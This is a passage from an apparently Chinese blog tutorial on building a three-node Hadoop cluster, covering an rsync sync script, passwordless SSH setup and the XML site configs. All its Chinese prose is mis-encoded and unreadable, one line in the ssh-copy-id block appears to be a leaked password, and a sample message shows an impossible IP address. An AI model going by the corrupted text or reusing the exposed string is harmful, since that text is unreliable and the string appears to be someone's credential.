fname=$(basename $file)</span><br><span class="line">				ssh $host &quot;mkdir -p $pdir&quot;</span><br><span class="line">				rsync -av $pdir/$fname $host:$pdir</span><br><span class="line">    else</span><br><span class="line">        echo $file does not exists!</span><br><span class="line">		fi </span><br><span class="line">	done</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h4 id="åˆ†å‘ç¯å¢ƒå˜é‡"><a href="#åˆ†å‘ç¯å¢ƒå˜é‡" class="headerlink" title="åˆ†å‘ç¯å¢ƒå˜é‡"></a>åˆ†å‘ç¯å¢ƒå˜é‡</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">ä¿®æ”¹è„šæœ¬xsyncå…·æœ‰æ‰§è¡Œæƒé™</span></span><br><span class="line">[huang@hadoop102 bin]$ chmod +x xsync </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å°†è„šæœ¬å¤åˆ¶åˆ°/binï¼Œä»¥ä¾¿å…¨å±€è°ƒç”¨</span></span><br><span class="line">[huang@hadoop102 bin]$ sudo cp xsync /bin/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¦‚æœç”¨äº†sudoï¼Œé‚£ä¹ˆxsyncä¸€å®šè¦ç»™å®ƒçš„è·¯å¾„è¡¥å…¨</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">åŒæ­¥ç¯å¢ƒå˜é‡é…ç½®ï¼ˆrootæ‰€æœ‰è€…ï¼‰</span></span><br><span class="line">[huang@hadoop102 ~]$ sudo ./bin/xsync /etc/profile.d/my_env.sh </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">è®©ç¯å¢ƒå˜é‡ç”Ÿæ•ˆ</span></span><br><span class="line">[huang@hadoop102 ~]$ ssh huang@hadoop103</span><br><span class="line">[huang@hadoop103 ~]$ source /etc/profile</span><br><span class="line">[huang@hadoop103 ~]$ ssh huang@hadoop104</span><br><span class="line">[huang@hadoop104 ~]$ source /etc/profile</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="SSHæ— å¯†ç ç™»é™†é…ç½®"><a href="#SSHæ— å¯†ç ç™»é™†é…ç½®" class="headerlink" title="SSHæ— å¯†ç ç™»é™†é…ç½®"></a>SSHæ— å¯†ç ç™»é™†é…ç½®</h3><h4 id="å…å¯†ç ç™»é™†åŸç†"><a href="#å…å¯†ç ç™»é™†åŸç†" class="headerlink" title="å…å¯†ç ç™»é™†åŸç†"></a>å…å¯†ç ç™»é™†åŸç†</h4><p><strong>1.é€šå¸¸çš„sshå¯†ç ç™»é™†è¿‡ç¨‹</strong></p>
<ul>
<li>ç”¨æˆ·å‘æ‰€è¦ç™»é™†çš„è¿œç¨‹ä¸»æœºå‘é€ç™»é™†è¯·æ±‚</li>
<li>è¿œç¨‹ä¸»æœºæ”¶åˆ°ç”¨æˆ·çš„ç™»å½•è¯·æ±‚ï¼ŒæŠŠè‡ªå·±çš„å…¬é’¥å‘é€ç»™ç”¨æˆ·</li>
<li>ç”¨æˆ·ä½¿ç”¨è¿™ä¸ªå…¬é’¥ï¼Œå°†ç™»é™†å¯†ç åŠ å¯†åï¼Œå‘é€ç»™è¿œç¨‹ä¸»æœº</li>
<li>è¿œç¨‹ä¸»æœºç”¨è‡ªå·±çš„ç§é’¥ï¼Œè§£å¯†ç™»é™†å¯†ç ï¼Œå¦‚æœå¯†ç æ­£ç¡®ï¼Œå°±åŒæ„ç”¨æˆ·ç™»é™†</li>
</ul>
<p>åœ¨linuxä¸­ï¼Œå¦‚æœç¬¬ä¸€æ¬¡é€šè¿‡sshç™»é™†è¿œç¨‹ä¸»æœºï¼Œä¼šå‡ºç°ä»¥ä¸‹æç¤ºï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ ssh huang@hadoop103</span><br><span class="line">The authenticity of host &#x27;hadoop103 (10.211.55.5)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:wsBGThjnNNKRLdb8nms49AJFfnTt6erg5jHj4bCXm40.</span><br><span class="line">ECDSA key fingerprint is MD5:93:ee:77:88:bc:7a:ed:0a:3d:d6:62:ce:95:38:be:05.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br></pre></td></tr></table></figure>

<p>è¿™æ®µè¯çš„æ„æ€æ˜¯ï¼Œæ— æ³•ç¡®è®¤hostä¸»æœºçš„çœŸå®æ€§ï¼Œå…¬é’¥æŒ‡çº¹å’ŒMD5å¯èƒ½ä¼šè¢«ä¸­é—´äººæ”»å‡»æ›¿æ¢ï¼Œé—®ä½ è¿˜æƒ³ç»§ç»­å—ï¼Ÿ</p>
<p>æ‰€è°“çš„â€œå…¬é’¥æŒ‡çº¹â€ï¼Œæ˜¯æŒ‡å…¬é’¥é•¿åº¦è¾ƒé•¿ï¼ˆè¿™é‡Œé‡‡ç”¨RSAç®—æ³•ï¼Œé•¿è¾¾1024ä½ï¼‰ï¼Œå¾ˆéš¾æ¯”å¯¹ï¼Œæ‰€ä»¥å¯¹å…¶è¿›è¡ŒMD5è®¡ç®—ï¼Œå°†ä»–å˜æˆ128ä½çš„æŒ‡çº¹ã€‚ä¸Šåˆ—ä¸­æ˜¯93:ee:77:88:bc:7a:ed:0a:3d:d6:62:ce:95:38:be:05.å†è¿›è¡Œæ¯”è¾ƒï¼Œå°±å®¹æ˜“å¤šäº†ã€‚</p>
<p>å‡å®šç»è¿‡é£é™©è¡¡é‡ä»¥åï¼Œç”¨æˆ·å†³å®šæ¥å—è¿™ä¸ªè¿œç¨‹ä¸»æœºçš„å…¬é’¥ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Are you sure you want to continue connecting (yes/no)?yes</span><br></pre></td></tr></table></figure>

<p>ç³»ç»Ÿä¼šå‡ºç°ä¸€å¥æç¤ºï¼Œè¡¨ç¤ºhostä¸»æœºå·²ç»å¾—åˆ°è®¤å¯ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Warning: Permanently added &#x27;host,12.18.429.21&#x27; (RSA) to the list of known hosts.</span><br></pre></td></tr></table></figure>

<p>ç„¶åï¼Œä¼šè¦æ±‚è¾“å…¥å¯†ç ã€‚</p>
<p>å¦‚æœå¯†ç æ­£ç¡®ï¼Œå°±å¯ä»¥ç™»å½•äº†ã€‚</p>
<p>å½“è¿œç¨‹ä¸»æœºçš„å…¬é’¥è¢«æ¥å—ä»¥åï¼Œå®ƒå°±ä¼šè¢«ä¿å­˜åœ¨ç”¨æˆ·homeç›®å½•çš„$HOME&#x2F;.ssh&#x2F;known_hostsæ–‡ä»¶ä¹‹ä¸­ã€‚ä¸‹æ¬¡å†è¿æ¥è¿™å°è¿œç¨‹ä¸»æœºï¼Œç³»ç»Ÿå°±ä¼šè®¤å‡ºå®ƒçš„å…¬é’¥å·²ç»ä¿å­˜åœ¨æœ¬åœ°äº†ï¼Œä»è€Œè·³è¿‡è­¦å‘Šéƒ¨åˆ†ï¼Œç›´æ¥æç¤ºè¾“å…¥å¯†ç ã€‚</p>
<p>å¦‚æœè¿œç¨‹ä¸»æœºé‡æ–°è£…è¿‡ç³»ç»Ÿæˆ–å› ä¸ºåˆ«çš„åŸå› ï¼Œå¯¼è‡´sshæŒ‡çº¹æ”¹å˜ï¼Œéœ€è¦æŠŠ.sshç›®å½•ä¸‹çš„know_hostsæ–‡ä»¶ä¸­ç›¸åº”è¿œç¨‹ä¸»æœºIPä¸€è‡´çš„æŒ‡çº¹åˆ é™¤ï¼Œå†é€šè¿‡sshç™»å½•ä¸€æ¬¡å›ç­”yesï¼Œé‡æ–°è®¤è¯ä¸€æ¬¡æ–¹å¯ç™»å½•ã€‚æ³¨æ„.sshæ˜¯ç›®å½•æ˜¯ä»¥â€œ.â€å¼€å¤´çš„éšè—ç›®å½•ï¼Œéœ€è¦#ls -aå‚æ•°æ‰èƒ½çœ‹åˆ°ã€‚è€Œä¸”è¿™ä¸ªç›®å½•çš„æƒé™å¿…é¡»æ˜¯700ï¼Œå¹¶ä¸”ç”¨æˆ·çš„homeç›®å½•ä¹Ÿä¸èƒ½ç»™å…¶ä»–ç”¨æˆ·å†™æƒé™ï¼Œå¦åˆ™sshæœåŠ¡å™¨ä¼šæ‹’ç»ç™»å½•ã€‚å¦‚æœå‘ç”Ÿä¸èƒ½ç™»å½•çš„é—®é¢˜ï¼Œå¯ä»¥æŸ¥çœ‹æœåŠ¡å™¨ä¸Šçš„æ—¥å¿—æ–‡ä»¶&#x2F;var&#x2F;log&#x2F;secureã€‚</p>
<p><strong>2.å…¬é’¥ç™»é™†ï¼ˆå…å¯†ç ç™»é™†ï¼‰</strong></p>
<p>AæœåŠ¡å™¨æƒ³è¦æ— å¯†ç ç™»é™†BæœåŠ¡å™¨çš„è¯ï¼Œå¾—æŠŠè‡ªå·±çš„å…¬é’¥ç»™Bï¼ŒBå¦‚æœæƒ³è®©Aæ— å¯†ç ç™»é™†å°±è®¤å¯Açš„å…¬é’¥ï¼Œè¿™æ ·Açš„å‘é€çš„æŒ‡ä»¤ä¸ä¿å¯†ï¼ˆå› ä¸ºå…¬é’¥æ˜¯å…¬å¼€çš„ï¼‰ï¼Œä½†æ˜¯Bè¿”å›çš„ç»“æœåªæœ‰Aèƒ½è§£å¼€</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220046874.png" alt="image-20210628003617469"></p>
<h4 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">ç”Ÿæˆå…¬é’¥å’Œç§é’¥</span></span><br><span class="line">[huang@hadoop102 ~]$ cd /home/huang/.ssh/</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-keygen -t rsa</span><br><span class="line"><span class="meta">#</span><span class="language-bash">æŒ‰ä¸‰ä¸‹å›è½¦å°±ä¼šç”Ÿæˆrsaæ–‡ä»¶</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å°†å…¬é’¥æ‹·è´åˆ°è¦å…å¯†ç™»é™†çš„ç›®æ ‡æœºå™¨ä¸Š</span></span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop102</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop103</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop104</span><br><span class="line"></span><br><span class="line">ycbaby000623</span><br></pre></td></tr></table></figure>

<ul>
<li><p>è¿˜éœ€è¦åœ¨ hadoop103 ä¸Šé‡‡ç”¨ huang è´¦å·é…ç½®ä¸€ä¸‹æ— å¯†ç™»å½•åˆ° hadoop102ã€hadoop103ã€ hadoop104 æœåŠ¡å™¨ä¸Šã€‚</p>
</li>
<li><p>è¿˜éœ€è¦åœ¨ hadoop104 ä¸Šé‡‡ç”¨ huang è´¦å·é…ç½®ä¸€ä¸‹æ— å¯†ç™»å½•åˆ° hadoop102ã€hadoop103ã€ hadoop104 æœåŠ¡å™¨ä¸Šã€‚</p>
</li>
<li><p>è¿˜éœ€è¦åœ¨ hadoop102 ä¸Šé‡‡ç”¨ root è´¦å·ï¼Œé…ç½®ä¸€ä¸‹æ— å¯†ç™»å½•åˆ° hadoop102ã€hadoop103ã€ hadoop104;</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@hadoop102 .ssh]# ll</span><br><span class="line">æ€»ç”¨é‡ 16</span><br><span class="line">-rw-------. 1 root root  396 6æœˆ  28 00:51 authorized_keys</span><br><span class="line">-rw-------. 1 root root 1679 6æœˆ  28 00:50 id_rsa</span><br><span class="line">-rw-r--r--. 1 root root  396 6æœˆ  28 00:50 id_rsa.pub</span><br><span class="line">-rw-r--r--. 1 root root  549 6æœˆ  28 00:30 known_hosts</span><br></pre></td></tr></table></figure>

<ul>
<li>Known_hosts: è®°å½•sshè®¿é—®è¿‡è®¡ç®—æœºçš„å…¬é’¥ï¼ˆpublic keyï¼‰</li>
<li>id_rsa: ç”Ÿæˆçš„ç§é’¥</li>
<li>id_rsa.pub: ç”Ÿæˆçš„å…¬é’¥</li>
<li>authorized_keys: å­˜æ”¾æˆæƒè¿‡çš„æ— å¯†ç ç™»å½•æœåŠ¡å™¨å…¬é’¥ï¼Œæˆæƒè¿‡çš„æœåŠ¡å™¨å¯ä»¥æ— å¯†ç è®¿é—®æœ¬æœåŠ¡å™¨</li>
</ul>
<h3 id="é›†ç¾¤é…ç½®"><a href="#é›†ç¾¤é…ç½®" class="headerlink" title="é›†ç¾¤é…ç½®"></a>é›†ç¾¤é…ç½®</h3><h4 id="é›†ç¾¤è§„åˆ’"><a href="#é›†ç¾¤è§„åˆ’" class="headerlink" title="é›†ç¾¤è§„åˆ’"></a>é›†ç¾¤è§„åˆ’</h4><ul>
<li>NameNodeå’ŒSecondaryNameNode ä¸è¦å®‰è£…åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Š</li>
<li>ResourceManageå¾ˆæ¶ˆè€—å†…å­˜ï¼Œæœ€å¥½ä¸è¦å’ŒNameNodeï¼ŒSecondaryNameNodeé…ç½®åœ¨åŒä¸€å°æœºå™¨ä¸Š</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220046885.png" alt="image-20210628012056622"></p>
<h4 id="é…ç½®æ–‡ä»¶è¯´æ˜"><a href="#é…ç½®æ–‡ä»¶è¯´æ˜" class="headerlink" title="é…ç½®æ–‡ä»¶è¯´æ˜"></a>é…ç½®æ–‡ä»¶è¯´æ˜</h4><p>Hadoop é…ç½®æ–‡ä»¶åˆ†ä¸¤ç±»:é»˜è®¤é…ç½®æ–‡ä»¶å’Œè‡ªå®šä¹‰é…ç½®æ–‡ä»¶ï¼Œåªæœ‰ç”¨æˆ·æƒ³ä¿®æ”¹æŸä¸€é»˜è®¤</p>
<p>é…ç½®å€¼æ—¶ï¼Œæ‰éœ€è¦ä¿®æ”¹è‡ªå®šä¹‰é…ç½®æ–‡ä»¶ï¼Œæ›´æ”¹ç›¸åº”å±æ€§å€¼ã€‚</p>
<h5 id="é»˜è®¤é…ç½®æ–‡ä»¶"><a href="#é»˜è®¤é…ç½®æ–‡ä»¶" class="headerlink" title="é»˜è®¤é…ç½®æ–‡ä»¶"></a>é»˜è®¤é…ç½®æ–‡ä»¶</h5><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220049179.png" alt="image-20210628012641270"></p>
<h5 id="è‡ªå®šä¹‰é…ç½®æ–‡ä»¶"><a href="#è‡ªå®šä¹‰é…ç½®æ–‡ä»¶" class="headerlink" title="è‡ªå®šä¹‰é…ç½®æ–‡ä»¶"></a>è‡ªå®šä¹‰é…ç½®æ–‡ä»¶</h5><p><strong>core-site.xml</strong>ã€<strong>hdfs-site.xml</strong>ã€<strong>yarn-site.xml</strong>ã€<strong>mapred-site.xml</strong> å››ä¸ªé…ç½®æ–‡ä»¶å­˜æ”¾åœ¨ $HADOOP_HOME&#x2F;etc&#x2F;hadoop è¿™ä¸ªè·¯å¾„ä¸Šï¼Œç”¨æˆ·å¯ä»¥æ ¹æ®é¡¹ç›®éœ€æ±‚é‡æ–°è¿›è¡Œä¿®æ”¹é…ç½®ã€‚</p>
<h4 id="é…ç½®é›†ç¾¤"><a href="#é…ç½®é›†ç¾¤" class="headerlink" title="é…ç½®é›†ç¾¤"></a>é…ç½®é›†ç¾¤</h4><h5 id="æ ¸å¿ƒé…ç½®æ–‡ä»¶"><a href="#æ ¸å¿ƒé…ç½®æ–‡ä»¶" class="headerlink" title="æ ¸å¿ƒé…ç½®æ–‡ä»¶"></a>æ ¸å¿ƒé…ç½®æ–‡ä»¶</h5><p>é…ç½®core-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd $HADOOP_HOME/etc/hadoop</span><br><span class="line">[huang@hadoop102 hadoop]$ vi core-site.xml </span><br></pre></td></tr></table></figure>

<p>å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;configuration.xsl&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- æŒ‡å®š NameNode çš„åœ°å€ --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>fs.defaultFS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://hadoop102:8020<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- æŒ‡å®š hadoop æ•°æ®çš„å­˜å‚¨ç›®å½• --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.tmp.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/opt/module/hadoop-3.1.3/data<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- é…ç½® HDFS ç½‘é¡µç™»å½•ä½¿ç”¨çš„é™æ€ç”¨æˆ·ä¸º huang --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.http.staticuser.user<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>huang<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="HDFSé…ç½®æ–‡ä»¶"><a href="#HDFSé…ç½®æ–‡ä»¶" class="headerlink" title="HDFSé…ç½®æ–‡ä»¶"></a>HDFSé…ç½®æ–‡ä»¶</h5><p>é…ç½®hdfs-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ vi hdfs-site.xml </span><br></pre></td></tr></table></figure>

<p>å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;configuration.xsl&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- nn webç«¯è®¿é—®åœ°å€--&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.http-address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:9870<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 2nn web ç«¯è®¿é—®åœ°å€--&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.secondary.http-address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop104:9868<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="YARNé…ç½®æ–‡ä»¶"><a href="#YARNé…ç½®æ–‡ä»¶" class="headerlink" title="YARNé…ç½®æ–‡ä»¶"></a>YARNé…ç½®æ–‡ä»¶</h5><p>é…ç½®yarn-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ vi yarn-site.xml </span><br></pre></td></tr></table></figure>

<p>å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;configuration.xsl&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- æŒ‡å®š MR èµ° shuffle --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.aux-services<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>mapreduce_shuffle<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- æŒ‡å®š ResourceManager çš„åœ°å€--&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.hostname<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop103<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- ç¯å¢ƒå˜é‡çš„ç»§æ‰¿ --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.env-whitelist<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>JAVA_HOME,HADOOP_COMMON_HOME,HADOOP_HDFS_HOME,HADOOP_CONF_DIR,CLASSPATH_PREPEND_DISTCACHE,HADOOP_YARN_HOME,HADOOP_MAP RED_HOME<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="MapReduceé…ç½®æ–‡ä»¶"><a href="#MapReduceé…ç½®æ–‡ä»¶" class="headerlink" title="MapReduceé…ç½®æ–‡ä»¶"></a>MapReduceé…ç½®æ–‡ä»¶</h5><p>é…ç½®mapred-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ vi mapred-site.xml </span><br></pre></td></tr></table></figure>

<p>å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;configuration.xsl&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- æŒ‡å®š MapReduce ç¨‹åºè¿è¡Œåœ¨ Yarn ä¸Š --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.framework.name<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>yarn<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.app.mapreduce.am.env<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.map.env<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.reduce.env<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="é›†ç¾¤åˆ†å‘"><a href="#é›†ç¾¤åˆ†å‘" class="headerlink" title="é›†ç¾¤åˆ†å‘"></a>é›†ç¾¤åˆ†å‘</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">åˆ†å‘Hadoop</span></span><br><span class="line">[huang@hadoop102 hadoop]$ xsync /opt/module/hadoop-3.1.3/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">åˆ†å‘jdk</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ xsync /opt/module/jdk1.8.0_212/</span><br></pre></td></tr></table></figure>

<h4 id="å»hadoop103å’Œhadoop104ä¸ŠæŸ¥çœ‹åˆ†å‘æƒ…å†µ"><a href="#å»hadoop103å’Œhadoop104ä¸ŠæŸ¥çœ‹åˆ†å‘æƒ…å†µ" class="headerlink" title="å»hadoop103å’Œhadoop104ä¸ŠæŸ¥çœ‹åˆ†å‘æƒ…å†µ"></a>å»hadoop103å’Œhadoop104ä¸ŠæŸ¥çœ‹åˆ†å‘æƒ…å†µ</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ ssh hadoop103</span><br><span class="line">Last failed login: Mon Jun 28 00:48:32 CST 2021 from hadoop103 on ssh:notty</span><br><span class="line">There was 1 failed login attempt since the last successful login.</span><br><span class="line">Last login: Mon Jun 28 00:47:23 2021 from hadoop102</span><br><span class="line">[huang@hadoop103 ~]$ cd /opt/module/hadoop-3.1.3/</span><br><span class="line"></span><br><span class="line">[huang@hadoop103 hadoop-3.1.3]$ ssh hadoop104</span><br><span class="line">Last login: Mon Jun 28 00:49:13 2021 from hadoop103</span><br><span class="line">[huang@hadoop104 ~]$ cat /opt/module/hadoop-3.1.3/etc/hadoop/core-site.xml </span><br></pre></td></tr></table></figure>



<h3 id="ç¾¤èµ·é›†ç¾¤"><a href="#ç¾¤èµ·é›†ç¾¤" class="headerlink" title="ç¾¤èµ·é›†ç¾¤"></a>ç¾¤èµ·é›†ç¾¤</h3><h4 id="é…ç½®workers"><a href="#é…ç½®workers" class="headerlink" title="é…ç½®workers"></a>é…ç½®workers</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">è¯¥æ–‡ä»¶ä¸­ä¸å…è®¸å‡ºç°ç©ºæ ¼ï¼Œç»“å°¾ä¹Ÿä¸è¡Œ</span></span><br><span class="line">[huang@hadoop102 ~]$ vi /opt/module/hadoop-3.1.3/etc/hadoop/workers </span><br><span class="line">hadoop102</span><br><span class="line">hadoop103</span><br><span class="line">hadoop104</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">åŒæ­¥æ‰€æœ‰èŠ‚ç‚¹é…ç½®æ–‡ä»¶</span></span><br><span class="line">[huang@hadoop102 ~]$ xsync /opt/module/hadoop-3.1.3/etc/</span><br><span class="line">==================== hadoop102 ====================</span><br><span class="line">sending 